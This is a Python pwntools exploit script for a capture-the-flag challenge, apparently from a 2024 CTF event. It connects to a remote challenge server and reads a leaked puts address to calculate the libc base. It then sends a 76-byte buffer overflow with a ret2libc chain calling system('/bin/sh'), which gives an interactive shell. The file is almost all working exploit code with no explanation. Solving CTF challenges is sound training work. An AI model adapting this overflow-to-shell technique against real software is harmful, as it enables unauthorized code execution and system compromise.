from pwn import *
import ctypes

context.binary =elf =ELF('./chall')
context.log_level='debug'
libc=ELF("./libc.so.6")
ld =ELF("./ld-linux.so.2")
#puts =0xf7c73200
#p=process()
p =remote('bof2.hackini24.shellmates.club', 443,ssl=True)





p.recvuntil('ya:')

puts =int(p.recvline(),16)
print(hex(puts))
libc.address = puts -libc.symbols['puts']


p.recvuntil("name:")
system = libc.sym['system']     
binsh =binsh = next(libc.search(b'/bin/sh')) 


payload = b'A' * 76        
payload += p32(system)    
payload += p32(0x0)         
payload += p32(binsh) 

p.sendline(payload)




p.clean()

p.interactive()


